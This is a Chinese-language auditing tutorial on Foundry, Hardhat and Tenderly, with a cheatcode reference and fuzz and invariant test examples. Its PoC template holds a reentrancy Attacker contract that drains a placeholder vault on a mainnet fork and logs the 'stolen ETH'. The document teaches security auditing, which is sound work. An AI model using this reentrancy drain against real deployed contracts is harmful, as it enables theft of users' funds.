# 工具链：Foundry、Hardhat、Tenderly 与审计员的工作台

学习目标用 Foundry 写出主网 fork 的 PoC；会用 cheatcodes、fuzz、invariant 测试；会用 cast 和交易模拟工具读链上状态。

前置章节1.2

## 1. 一句话理解

审计报告里的"高危"必须有 PoC。PoC 是一段能在本地 fork 上运行、证明资金可被盗的测试代码。

读图要点

- 审计员的主力工具是 Foundry：测试用 Solidity 写，速度快，内置 fuzz。

- Hardhat 项目很常见。审计时要能运行项目自带的测试，并读懂 JS/TS 部署脚本（部署脚本里经常藏着初始化顺序问题）。

- Tenderly 和 Sentio 用于"看"交易：调用树、存储变化、Gas 分布。应急分析时也用它们（见 3.6）。

## 3. Foundry 速查

 |  | 命令 / cheatcode | 作用

 | forge test -vvvv --mt testExploit | 运行指定测试，打印完整调用树

 | forge test --fork-url $RPC --fork-block-number N | 在主网某个区块的状态上测试

 | forge inspect C storageLayout | 输出存储布局

 | forge coverage | 测试覆盖率：找出没人测过的分支

 | cast sig "transfer(address,uint256)" | 计算函数选择器

 | cast storage ADDR SLOT | 读取任意存储槽（包括 private 变量）

 | cast run TXHASH | 在本地重放并追踪一笔历史交易

 | vm.prank(addr) / vm.startPrank | 伪装下一次 / 后续调用的 msg.sender

 | vm.deal(addr, amt) / deal(token, addr, amt) | 设置 ETH / 代币余额

 | vm.warp(ts) / vm.roll(n) | 修改时间戳 / 区块号

 | vm.expectRevert(sel) | 断言下一次调用会回滚

 | vm.createSelectFork("mainnet", N) | 在测试中切换 fork

 | vm.store(addr, slot, val) / vm.load | 直接写 / 读存储

## 4. PoC 模板

test/Exploit.t.sol
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.24;
import "forge-std/Test.sol";

interface IVault { function deposit() external payable; function withdraw(uint256) external; }

contract Attacker {
    IVault immutable v; uint256 constant AMT = 1 ether;
    constructor(IVault _v) { v = _v; }
    function attack() external payable { v.deposit{value: AMT}(); v.withdraw(AMT); }
    receive() external payable {                    // 回调中再次进入
        if (address(v).balance >= AMT) v.withdraw(AMT);
    }
}

contract ExploitTest is Test {
    IVault vault = IVault(0x0000000000000000000000000000000000001234); // 目标地址（示例）

    function setUp() public {
        vm.createSelectFork(vm.envString("RPC_URL"), 19_000_000);   // 固定区块，结果可复现
    }

    function testExploit() public {
        uint256 before = address(vault).balance;
        Attacker a = new Attacker(vault);
        vm.deal(address(this), 1 ether);
        a.attack{value: 1 ether}();
        emit log_named_decimal_uint("stolen ETH", address(a).balance, 18);
        assertGt(address(a).balance, 1 ether, "exploit failed");
        assertLt(address(vault).balance, before);
    }
}

好 PoC 的标准：固定区块号；断言资金变化；打印关键数值；一条命令能跑通；不依赖私钥或主网交易。

## 5. Fuzz 与不变量测试

// 模糊测试：Foundry 随机生成 amount
function testFuzz_DepositWithdraw(uint96 amount) public {
    vm.assume(amount > 0);
    vault.deposit{value: amount}();
    vault.withdraw(amount);
    assertEq(address(vault).balance, 0);
}

// 不变量测试：随机调用序列后，性质必须始终成立
function invariant_Solvent() public view {
    assertGe(address(vault).balance, vault.totalDeposits());
}

不变量测试是审计复杂协议的核心武器，3.4 章有交互实验。Foundry 最佳实践：用 handler 合约限制调用范围；用 ghost 变量记录期望值；对每个断言写清楚失败信息。
